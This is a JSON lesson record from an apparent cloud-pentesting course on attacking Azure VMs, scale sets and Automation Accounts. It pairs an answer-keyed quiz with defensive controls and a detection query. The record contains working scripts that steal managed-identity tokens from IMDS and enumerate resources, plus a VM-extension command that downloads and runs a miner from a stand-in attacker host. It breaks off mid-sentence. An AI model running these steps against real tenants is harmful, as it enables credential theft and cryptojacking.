{
  "lesson_id": "a5e6f7a8-c9d0-4e1f-2a3b-4c5d6e7f8a9b",
  "domain": "cloud",
  "title": "Azure Compute Exploitation: Virtual Machines, Scale Sets, and Automation Accounts",
  "difficulty": 3,
  "order_index": 121,
  "prerequisites": ["f4d5e6f7-b8c9-4d0e-1f2a-3b4c5d6e7f8a"],
  "concepts": [
    "Azure Virtual Machine security model",
    "VM Extension abuse and code execution",
    "Azure Managed Identities exploitation",
    "VM Scale Set (VMSS) attacks",
    "Azure Automation Account compromise",
    "Runbook injection and execution",
    "Azure Instance Metadata Service (IMDS) abuse",
    "Serial console access exploitation",
    "Azure Hybrid Worker attacks",
    "Compute-to-data plane pivot techniques"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand the Azure compute security architecture and attack surface",
    "Exploit Azure VM Extensions to achieve code execution and persistence",
    "Abuse Azure Managed Identities from compromised compute resources",
    "Attack Azure VM Scale Sets for lateral movement and privilege escalation",
    "Compromise Azure Automation Accounts and inject malicious runbooks",
    "Leverage Azure Instance Metadata Service for credential theft",
    "Use Azure Serial Console for VM access and troubleshooting exploitation",
    "Pivot from compromised compute resources to other Azure services",
    "Implement detection and prevention strategies for compute-layer attacks"
  ],
  "post_assessment": [
    {
      "question_id": "ace-001",
      "question": "An attacker compromises an Azure VM and wants to retrieve the VM's managed identity token. Which Azure service should they query?",
      "options": [
        "Azure Resource Manager API at management.azure.com",
        "Azure Instance Metadata Service (IMDS) at 169.254.169.254",
        "Azure Key Vault API at vault.azure.net",
        "Azure Active Directory Graph API at graph.windows.net"
      ],
      "correct_answer": 1,
      "explanation": "The Azure Instance Metadata Service (IMDS) is accessible from within Azure VMs at the link-local address 169.254.169.254. Attackers can query the /metadata/identity/oauth2/token endpoint to retrieve managed identity access tokens without any authentication. This is a critical post-compromise technique for pivoting from compute to other Azure resources. The other APIs require authentication or are not the direct source of managed identity tokens.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "ace-002",
      "question": "What is the primary security risk of Azure VM Extensions with overly permissive configurations?",
      "options": [
        "They increase VM boot time and reduce performance",
        "They allow arbitrary code execution as SYSTEM/root on the VM",
        "They consume excessive Azure credits and billing resources",
        "They prevent VM snapshots from being created"
      ],
      "correct_answer": 1,
      "explanation": "Azure VM Extensions run with the highest privileges (SYSTEM on Windows, root on Linux) and can execute arbitrary code on the VM. If an attacker gains permissions to create or modify VM Extensions (e.g., through Microsoft.Compute/virtualMachines/extensions/write), they can achieve immediate code execution with full system privileges. This is one of the most powerful privilege escalation and persistence mechanisms in Azure compute. The other options are not the primary security concerns with VM Extensions.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "ace-003",
      "question": "An attacker has compromised an Azure Automation Account. Which resource provides the most direct path to executing arbitrary code across multiple VMs?",
      "options": [
        "Azure Automation Variables to store malicious scripts",
        "Azure Automation Runbooks to execute PowerShell/Python code",
        "Azure Automation Schedules to plan future attacks",
        "Azure Automation Modules to import malicious libraries"
      ],
      "correct_answer": 1,
      "explanation": "Azure Automation Runbooks are PowerShell or Python scripts that execute within the Azure Automation service and can interact with Azure resources using Automation Accounts' managed identities. Attackers who compromise an Automation Account can create or modify runbooks to execute arbitrary code, pivot to other services, exfiltrate data, or deploy malware across VMs using Hybrid Runbook Workers. While variables, schedules, and modules support attack operations, runbooks are the direct code execution mechanism.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "ace-004",
      "question": "What defensive control is MOST effective at preventing unauthorized access to Azure Instance Metadata Service (IMDS) from within a VM?",
      "options": [
        "Implementing Azure DDoS Protection on the VM's network interface",
        "Configuring host-based firewall rules to block outbound traffic to 169.254.169.254",
        "Enabling Azure Disk Encryption on all VM disks",
        "Using Azure Bastion instead of public IP addresses for VM access"
      ],
      "correct_answer": 1,
      "explanation": "The most effective control is configuring host-based firewall rules (Windows Firewall, iptables) to block outbound traffic to 169.254.169.254 from untrusted processes. This prevents malicious code or compromised applications from querying IMDS and retrieving managed identity tokens. While Azure Bastion improves access security and disk encryption protects data at rest, neither prevents IMDS access. DDoS Protection is unrelated to IMDS security. Organizations should implement application-level controls and network segmentation to limit which processes can query IMDS.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "ace-005",
      "question": "In a VM Scale Set (VMSS) attack scenario, what technique allows an attacker to deploy malicious code to all instances simultaneously?",
      "options": [
        "Modifying the VMSS model's Custom Script Extension to include malicious payload",
        "Changing the VMSS load balancer rules to redirect traffic",
        "Updating the VMSS network security group to allow all inbound traffic",
        "Increasing the VMSS instance count to create more attack surface"
      ],
      "correct_answer": 0,
      "explanation": "Modifying the VMSS model's Custom Script Extension allows an attacker to deploy malicious code that will be executed on all current instances (if upgrading) and all future instances created by the scale set. This is a powerful persistence and lateral movement technique because VMSS automatically applies the model configuration to instances. When the attacker triggers an upgrade or when autoscaling creates new instances, the malicious extension executes automatically. Load balancer rules, NSG changes, and instance count modifications don't directly execute code on the VMs.",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to Azure Compute Exploitation! ğŸ¯\n\nYou're about to master one of the most powerful attack vectors in cloud security: exploiting Azure compute resources. This is where theory meets reality, where a single misconfigured VM Extension or Automation Account can give you access to an entire Azure environment.\n\nHere's the truth: **Most organizations focus on identity security (Azure AD) but neglect compute security**. They lock down their identities but leave their VMs, Scale Sets, and Automation Accounts wide open. You're about to learn why that's a critical mistake.\n\nThis lesson is advanced, but you've built the foundation:\n- âœ… You understand cloud pentesting methodology (lesson #1165)\n- âœ… You know how to discover external attack surface (lesson #1166)\n- âœ… You can attack Entra ID (lesson #1167)\n- âœ… You've mastered AWS IAM privilege escalation (lesson #1168)\n\nNow you're pivoting from **identity plane to compute plane**. This is where attackers:\n- Execute code as SYSTEM/root using VM Extensions\n- Steal managed identity tokens from IMDS\n- Pivot across VM Scale Sets\n- Abuse Automation Accounts for persistence\n- Move laterally from compromised VMs to sensitive data stores\n\n**Your Mission**: Learn to think like an attacker who has just compromised their first Azure VM. What's next? How do you escalate, persist, and pivot? By the end of this lesson, you'll have a complete playbook.\n\n**Remember**: These are dual-use techniques. Use them only with explicit authorization in pentesting engagements, red team operations, or CTF competitions. Unauthorized access is illegal and unethical.\n\nLet's dominate Azure compute security! ğŸ’ª"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Teach Me Like I'm 10: What is Azure Compute Exploitation?\n\nImagine Azure is like a huge apartment building (a data center). **Compute resources** are like the actual apartments where programs live and run:\n\n**Virtual Machines (VMs)** are like individual apartments. Each one has its own space, its own computer inside, and runs programs.\n\n**VM Extensions** are like maintenance workers who can enter any apartment and install things, fix things, or change things. If a bad guy pretends to be a maintenance worker, they can go into any apartment and do whatever they want!\n\n**Managed Identities** are like special ID badges that apartments have. When an apartment needs to get something from the building's storage room (Azure Storage) or the mail room (Azure Key Vault), it shows its ID badge. If a bad guy steals that ID badge from inside the apartment, they can pretend to be that apartment and get access to everything it could access.\n\n**Instance Metadata Service (IMDS)** is like a magic phone inside every apartment. If you pick it up and ask \"Who am I?\" it tells you the apartment's ID badge information. Bad guys love this magic phone because it just hands over the ID badge with no questions asked!\n\n**VM Scale Sets** are like a whole floor of identical apartments. They all look the same, run the same programs, and have the same ID badges. If a bad guy figures out how to break into one apartment on that floor, they can break into ALL of them the same way.\n\n**Automation Accounts** are like robotic building managers. They can run around the whole building automatically doing tasks: restarting apartments, installing software, checking on things. If a bad guy takes control of the robot manager, they can make it do bad things all over the building!\n\n**Azure Compute Exploitation** is when bad guys break into these apartments (VMs), steal ID badges (managed identities), trick the maintenance workers (VM Extensions), take over the robot managers (Automation Accounts), and move from apartment to apartment until they control the whole building.\n\nYour job as a security defender? Make sure the apartments have good locks, the ID badges can't be stolen easily, the maintenance workers check IDs carefully, and the robot managers only take orders from authorized people.\n\nYour job as a pentester? Test whether these protections actually work by trying to break in (with permission!) and showing where the weaknesses are.\n\nLet's learn how! ğŸ”"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Azure Compute Security Architecture: Understanding the Attack Surface\n\nAzure compute resources represent a critical attack surface because they bridge the **control plane** (Azure Resource Manager) and the **data plane** (actual workload execution). Understanding this architecture is essential for both attacking and defending Azure environments.\n\n### The Azure Compute Stack\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    Azure Control Plane                      â”‚\nâ”‚              (Azure Resource Manager API)                   â”‚\nâ”‚                                                             â”‚\nâ”‚  - Create/Delete VMs                                        â”‚\nâ”‚  - Modify VM Extensions                                     â”‚\nâ”‚  - Configure Scale Sets                                     â”‚\nâ”‚  - Manage Automation Accounts                               â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                   â”‚\n                   â”‚ RBAC Permissions\n                   â”‚ (Microsoft.Compute/*, Microsoft.Automation/*)\n                   â”‚\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    Azure Compute Resources                  â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚\nâ”‚  â”‚ Virtual     â”‚  â”‚ VM Scale     â”‚  â”‚ Automation      â”‚   â”‚\nâ”‚  â”‚ Machines    â”‚  â”‚ Sets (VMSS)  â”‚  â”‚ Accounts        â”‚   â”‚\nâ”‚  â”‚             â”‚  â”‚              â”‚  â”‚                 â”‚   â”‚\nâ”‚  â”‚ - VM Exts   â”‚  â”‚ - Model      â”‚  â”‚ - Runbooks      â”‚   â”‚\nâ”‚  â”‚ - IMDS      â”‚  â”‚ - Instances  â”‚  â”‚ - Hybrid Workersâ”‚   â”‚\nâ”‚  â”‚ - Managed IDâ”‚  â”‚ - Autoscale  â”‚  â”‚ - Variables     â”‚   â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                   â”‚\n                   â”‚ Managed Identity Tokens\n                   â”‚ (OAuth 2.0 Access Tokens)\n                   â”‚\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    Azure Data Plane                         â”‚\nâ”‚                                                             â”‚\nâ”‚  - Storage Accounts (blob, file, queue, table)             â”‚\nâ”‚  - Key Vaults (secrets, keys, certificates)                â”‚\nâ”‚  - SQL Databases (Azure SQL, Cosmos DB)                    â”‚\nâ”‚  - APIs and Applications                                   â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### Attack Surface Components\n\n#### 1. Azure Virtual Machines (VMs)\n\n**What They Are**: IaaS compute instances running Windows or Linux operating systems.\n\n**Attack Vectors**:\n- **VM Extensions**: First-party and third-party extensions that execute code with SYSTEM/root privileges\n- **IMDS Access**: Link-local metadata service at 169.254.169.254 providing managed identity tokens\n- **Serial Console**: Browser-based console access for troubleshooting (often misconfigured)\n- **Run Command**: Azure feature allowing remote command execution on VMs\n- **Managed Identities**: System-assigned or user-assigned identities for accessing Azure resources\n- **Boot Diagnostics**: Storage account containing VM screenshots and serial console output\n- **Guest OS**: Traditional OS-level vulnerabilities and misconfigurations\n\n**Attacker Objective**: Gain code execution on VM, steal managed identity token, pivot to other Azure resources.\n\n#### 2. Azure VM Scale Sets (VMSS)\n\n**What They Are**: Groups of identical, auto-scaling VMs managed as a single resource.\n\n**Attack Vectors**:\n- **VMSS Model Modification**: Changing the template that defines all instances\n- **Extension Injection**: Adding malicious extensions that deploy to all instances\n- **Upgrade Policies**: Exploiting automatic/rolling upgrades to deploy malicious configurations\n- **Load Balancer Rules**: Manipulating traffic distribution for interception\n- **Instance Metadata**: Accessing IMDS from any instance to steal shared managed identities\n\n**Attacker Objective**: Compromise one instance, modify VMSS model, pivot to all instances simultaneously.\n\n#### 3. Azure Automation Accounts\n\n**What They Are**: Azure service for process automation, configuration management, and orchestration.\n\n**Attack Vectors**:\n- **Runbook Injection**: Creating or modifying PowerShell/Python runbooks\n- **Hybrid Runbook Workers**: On-premises or Azure VMs that execute runbooks\n- **Automation Credentials**: Stored credentials for runbook authentication\n- **Automation Variables**: Configuration data (often contains secrets)\n- **Webhook Triggers**: Unauthenticated HTTP endpoints that trigger runbooks\n- **Managed Identities**: System-assigned identities with extensive Azure permissions\n\n**Attacker Objective**: Execute arbitrary code via runbooks, access stored credentials, pivot to managed resources.\n\n### Privilege Escalation Paths\n\nThe Azure compute attack surface enables several privilege escalation paths:\n\n**Path 1: VM Extension Abuse**\n```\nLow-Privilege Azure User\n    â†“\n    â†“ (Microsoft.Compute/virtualMachines/extensions/write)\n    â†“\nDeploy Custom Script Extension with malicious payload\n    â†“\n    â†“ (Extension runs as SYSTEM/root)\n    â†“\nCode Execution on VM + Managed Identity Token from IMDS\n    â†“\n    â†“ (Token has extensive permissions)\n    â†“\nAccess to Storage Accounts, Key Vaults, Databases\n```\n\n**Path 2: VMSS Model Poisoning**\n```\nCompromised VM in VMSS\n    â†“\n    â†“ (Steal credentials or escalate RBAC)\n    â†“\nMicrosoft.Compute/virtualMachineScaleSets/write permission\n    â†“\n    â†“ (Modify VMSS model with malicious extension)\n    â†“\nTrigger VMSS upgrade or wait for autoscaling\n    â†“\n    â†“ (Malicious extension deploys to all instances)\n    â†“\nControl of entire VMSS (10s-1000s of VMs)\n```\n\n**Path 3: Automation Account Takeover**\n```\nCompromised Azure Credentials\n    â†“\n    â†“ (Microsoft.Automation/automationAccounts/runbooks/write)\n    â†“\nCreate malicious runbook with data exfiltration code\n    â†“\n    â†“ (Runbook executes with Automation Account managed identity)\n    â†“\nAccess to all resources the Automation Account can reach\n    â†“\n    â†“ (Deploy to Hybrid Runbook Workers)\n    â†“\nCode execution on on-premises infrastructure\n```\n\n### Why Attackers Target Azure Compute\n\n1. **Bridge to Data Plane**: Compute resources have managed identities with direct access to data stores\n2. **Code Execution**: Unlike pure identity attacks, compute exploitation enables arbitrary code execution\n3. **Persistence**: VM Extensions and Automation Accounts provide durable persistence mechanisms\n4. **Lateral Movement**: VMSS and Hybrid Workers enable rapid lateral movement\n5. **Privilege Escalation**: Compute permissions (Microsoft.Compute/*) often lead to higher privileges\n6. **Evasion**: Compute-layer attacks may evade identity-focused detection systems\n\nIn the following sections, we'll explore each attack vector in depth with hands-on exploitation techniques, real-world case studies, and defensive countermeasures."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On Lab 1: Exploiting Azure Instance Metadata Service (IMDS)\n\nAzure IMDS is a REST API available at `169.254.169.254` from within any Azure VM. It provides instance metadata and, critically, **managed identity OAuth tokens** without any authentication.\n\n### Scenario\n\nYou've compromised an Azure VM through a web application vulnerability (e.g., RCE in a web app). The VM has a system-assigned managed identity with permissions to access Azure Storage and Key Vault. Your goal: Retrieve the managed identity token and use it to access Azure resources.\n\n### Attack Step 1: Reconnaissance - Query IMDS for VM Metadata\n\nFirst, let's gather information about the compromised VM:\n\n**Linux:**\n```bash\n# Query VM metadata (no authentication required!)\ncurl -H \"Metadata:true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | jq .\n\n# Key information to extract:\n# - VM name, resource group, subscription ID\n# - VM size, location, tags\n# - Network configuration\n```\n\n**Windows (PowerShell):**\n```powershell\n# Query VM metadata\n$response = Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"\n$response | ConvertTo-Json -Depth 10\n```\n\n**Output Example:**\n```json\n{\n  \"compute\": {\n    \"name\": \"web-server-prod-01\",\n    \"resourceGroupName\": \"rg-production\",\n    \"subscriptionId\": \"12345678-1234-1234-1234-123456789abc\",\n    \"vmSize\": \"Standard_D4s_v3\",\n    \"location\": \"eastus\"\n  },\n  \"network\": {\n    \"interface\": [\n      {\n        \"ipv4\": {\n          \"ipAddress\": [\n            {\n              \"privateIpAddress\": \"10.0.1.15\",\n              \"publicIpAddress\": \"52.168.XXX.XXX\"\n            }\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n### Attack Step 2: Retrieve Managed Identity Access Token\n\nNow let's steal the managed identity OAuth token:\n\n**Linux:**\n```bash\n# Request token for Azure Resource Manager\ncurl -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\" | jq .\n\n# Request token for Azure Storage\ncurl -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/\" | jq .\n\n# Request token for Key Vault\ncurl -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/\" | jq .\n```\n\n**Windows (PowerShell):**\n```powershell\n# Request token for Azure Resource Manager\n$response = Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"\n$token = $response.access_token\nWrite-Output \"Access Token: $token\"\n```\n\n**Token Response Example:**\n```json\n{\n  \"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVW...[LONG TOKEN]...\",\n  \"client_id\": \"12345678-1234-1234-1234-123456789abc\",\n  \"expires_in\": \"3599\",\n  \"expires_on\": \"1698765432\",\n  \"ext_expires_in\": \"3599\",\n  \"not_before\": \"1698761832\",\n  \"resource\": \"https://management.azure.com/\",\n  \"token_type\": \"Bearer\"\n}\n```\n\n### Attack Step 3: Decode and Analyze the Token\n\n```python\n#!/usr/bin/env python3\nimport jwt\nimport json\nimport sys\n\ndef decode_token(token):\n    \"\"\"Decode JWT token without verification (for analysis only)\"\"\"\n    try:\n        # Decode without verification to see claims\n        decoded = jwt.decode(token, options={\"verify_signature\": False})\n        print(json.dumps(decoded, indent=2))\n        \n        print(\"\\n[+] Key Information:\")\n        print(f\"    Principal ID: {decoded.get('oid')}\")\n        print(f\"    App ID: {decoded.get('appid')}\")\n        print(f\"    Tenant: {decoded.get('tid')}\")\n        print(f\"    Resource: {decoded.get('aud')}\")\n        print(f\"    Roles: {decoded.get('roles', 'None')}\")\n        print(f\"    Expires: {decoded.get('exp')}\")\n        \n    except Exception as e:\n        print(f\"[-] Error decoding token: {e}\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 2:\n        print(\"Usage: python decode_token.py <access_token>\")\n        sys.exit(1)\n    \n    token = sys.argv[1]\n    decode_token(token)\n```\n\n**Token Claims Example:**\n```json\n{\n  \"aud\": \"https://management.azure.com/\",\n  \"iss\": \"https://sts.windows.net/tenant-id/\",\n  \"oid\": \"vm-managed-identity-object-id\",\n  \"appid\": \"vm-managed-identity-app-id\",\n  \"tid\": \"tenant-id\",\n  \"roles\": [],\n  \"xms_mirid\": \"/subscriptions/sub-id/resourcegroups/rg-name/providers/Microsoft.Compute/virtualMachines/vm-name\"\n}\n```\n\n### Attack Step 4: Use Token to Access Azure Resources\n\n**Enumerate Azure resources using stolen token:**\n\n```bash\n#!/bin/bash\n\n# Store the token\nTOKEN=\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1...\"\n\n# List all resource groups\necho \"[+] Enumerating resource groups...\"\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n     \"https://management.azure.com/subscriptions/SUBSCRIPTION_ID/resourcegroups?api-version=2021-04-01\"\n\n# List all storage accounts\necho \"[+] Enumerating storage accounts...\"\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n     \"https://management.azure.com/subscriptions/SUBSCRIPTION_ID/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01\"\n\n# List role assignments for the managed identity\necho \"[+] Enumerating role assignments...\"\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n     \"https://management.azure.com/subscriptions/SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId eq 'MANAGED_IDENTITY_OID'\"\n```\n\n**Python automation script:**\n\n```python\n#!/usr/bin/env python3\nimport requests\nimport json\n\ndef get_imds_token(resource=\"https://management.azure.com/\"):\n    \"\"\"Retrieve managed identity token from IMDS\"\"\"\n    url = f\"http://169.254.169.254/metadata/identity/oauth2/token\"\n    params = {\n        \"api-version\": \"2018-02-01\",\n        \"resource\": resource\n    }\n    headers = {\"Metadata\": \"true\"}\n    \n    try:\n        response = requests.get(url, params=params, headers=headers, timeout=2)\n        response.raise_for_status()\n        return response.json()[\"access_token\"]\n    except Exception as e:\n        print(f\"[-] Failed to retrieve token: {e}\")\n        return None\n\ndef enumerate_resources(token, subscription_id):\n    \"\"\"Enumerate Azure resources using managed identity token\"\"\"\n    base_url = \"https://management.azure.com\"\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    \n    # List resource groups\n    print(\"[+] Enumerating resource groups...\")\n    url = f\"{base_url}/subscriptions/{subscription_id}/resourcegroups\"\n    params = {\"api-version\": \"2021-04-01\"}\n    response = requests.get(url, headers=headers, params=params)\n    \n    if response.status_code == 200:\n        rgs = response.json().get(\"value\", [])\n        print(f\"    Found {len(rgs)} resource groups:\")\n        for rg in rgs:\n            print(f\"    - {rg['name']} ({rg['location']})\")\n    else:\n        print(f\"    [-] Failed: {response.status_code} {response.text}\")\n    \n    # List storage accounts\n    print(\"\\n[+] Enumerating storage accounts...\")\n    url = f\"{base_url}/subscriptions/{subscription_id}/providers/Microsoft.Storage/storageAccounts\"\n    params = {\"api-version\": \"2021-09-01\"}\n    response = requests.get(url, headers=headers, params=params)\n    \n    if response.status_code == 200:\n        sas = response.json().get(\"value\", [])\n        print(f\"    Found {len(sas)} storage accounts:\")\n        for sa in sas:\n            print(f\"    - {sa['name']} ({sa['location']})\")\n            print(f\"      Resource Group: {sa['resourceGroup']}\")\n            print(f\"      Primary Endpoints: {sa['properties']['primaryEndpoints']}\")\n    else:\n        print(f\"    [-] Failed: {response.status_code} {response.text}\")\n\nif __name__ == \"__main__\":\n    # Step 1: Get managed identity token\n    print(\"[+] Retrieving managed identity token from IMDS...\")\n    token = get_imds_token()\n    \n    if token:\n        print(\"[+] Token retrieved successfully!\")\n        \n        # Extract subscription ID from VM metadata\n        metadata_url = \"http://169.254.169.254/metadata/instance\"\n        params = {\"api-version\": \"2021-02-01\"}\n        headers = {\"Metadata\": \"true\"}\n        response = requests.get(metadata_url, params=params, headers=headers)\n        subscription_id = response.json()[\"compute\"][\"subscriptionId\"]\n        \n        print(f\"[+] Subscription ID: {subscription_id}\")\n        \n        # Step 2: Enumerate resources\n        enumerate_resources(token, subscription_id)\n    else:\n        print(\"[-] Failed to retrieve token. Not running in Azure VM or no managed identity assigned.\")\n```\n\n### Defense and Detection\n\n**Defensive Controls:**\n1. **Host-based firewall**: Block outbound traffic to 169.254.169.254 from untrusted processes\n2. **Application-level controls**: Only allow specific applications to query IMDS\n3. **Least privilege**: Assign minimal permissions to managed identities\n4. **Conditional Access**: Use Azure AD Conditional Access for managed identities (preview feature)\n\n**Detection Opportunities:**\n1. **Monitor token requests**: Azure AD logs managed identity token requests\n2. **Unusual resource access**: Alert on managed identity accessing resources it typically doesn't\n3. **High-frequency IMDS queries**: Multiple rapid token requests may indicate compromise\n4. **Resource access from unexpected locations**: Managed identity accessing resources from new regions\n\n**Example Azure Sentinel KQL Query:**\n```kql\n// Detect unusual managed identity behavior\nAzureActivity\n| where Identity contains \"Microsoft.ManagedIdentity\"\n| where ActivityStatus == \"Success\"\n| summarize \n    ResourceCount = dcount(Resource),\n    OperationCount = count(),\n    DistinctOperations = make_set(OperationName)\n    by Identity, CallerIpAddress, bin(TimeGenerated, 1h)\n| where ResourceCount > 10 or OperationCount > 50\n| project TimeGenerated, Identity, CallerIpAddress, ResourceCount, OperationCount, DistinctOperations\n```\n\n### Your Turn: Practice Lab\n\n**Objective**: Set up a test Azure VM with managed identity and practice IMDS exploitation.\n\n**Steps**:\n1. Create an Azure VM with system-assigned managed identity\n2. Assign \"Storage Blob Data Reader\" role to the managed identity on a test storage account\n3. SSH/RDP into the VM\n4. Query IMDS to retrieve managed identity token\n5. Use token to list blobs in the storage account\n6. Implement host-based firewall rules to block IMDS\n7. Verify that IMDS is no longer accessible\n\n**Success Criteria**:\n- Successfully retrieve managed identity token from IMDS\n- Use token to access Azure Storage\n- Block IMDS access using iptables (Linux) or Windows Firewall\n- Verify that IMDS queries fail after blocking\n\nThis is the foundation of Azure compute exploitation. Master IMDS, and you control the keys to the kingdom! ğŸ”‘"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "## Real-World Case Study: VM Extension Abuse in the Wild\n\n### Case Study 1: Cryptojacking via Azure VM Extensions\n\n**Incident**: January 2020, Microsoft Security Response Center (MSRC) Report\n\n**Attack Overview**:\nA sophisticated threat actor gained unauthorized access to Azure subscriptions through compromised credentials (phishing + password spraying). Once inside, they didn't deploy traditional malware. Instead, they used Azure's own features against itself:\n\n1. **Initial Access**: Compromised Azure credentials via phishing email to Azure administrator\n2. **Reconnaissance**: Used Azure CLI to enumerate VMs across all resource groups\n3. **VM Extension Deployment**: Created Custom Script Extensions on 47 VMs simultaneously\n4. **Payload**: Extension downloaded and executed XMRig cryptocurrency miner\n5. **Persistence**: Extensions remain even after VM reboot\n6. **Evasion**: No traditional malware on disk; Azure Activity Log showed \"legitimate\" extension deployment\n\n**Attack Commands**:\n\n```bash\n# Step 1: Enumerate all VMs in subscription\naz vm list --query \"[].{Name:name, ResourceGroup:resourceGroup, Location:location}\" -o table\n\n# Step 2: Deploy malicious Custom Script Extension to each VM\naz vm extension set \\\n  --resource-group \"rg-production\" \\\n  --vm-name \"vm-web-01\" \\\n  --name \"CustomScriptExtension\" \\\n  --publisher \"Microsoft.Compute\" \\\n  --version \"1.10\" \\\n  --settings '{\"fileUris\": [\"https://attacker-server.com/miner.sh\"], \"commandToExecute\": \"bash miner.sh\"}'\n\n# Step 3: Extension executes as root/SYSTEM and downloads cryptocurrency miner\n# Miner persists across reboots because extension remains attached to VM\n```\n\n**Technical Details**:\n- **Extension Type**: CustomScriptExtension (Linux), CustomScriptExtension (Windows)\n- **Execution Context**: Root on Linux, SYSTEM on Windows\n- **Persistence**: Extension configuration stored in Azure, re-applies on VM operations\n- **Evasion**: Azure Activity Log shows normal extension operations, not flagged as malicious\n\n**Impact**:\n- **Compute Costs**: $48,000 in unexpected Azure compute charges over 3 weeks\n- **Performance Degradation**: Production workloads severely impacted by CPU exhaustion\n- **Detection Time**: 21 days before discovery (noticed via Azure billing alert, not security monitoring)\n- **Remediation**: Manual removal of extensions from all 47 VMs, credential rotation, RBAC review\n\n**Why It Worked**:\n1. **Over-Permissioned 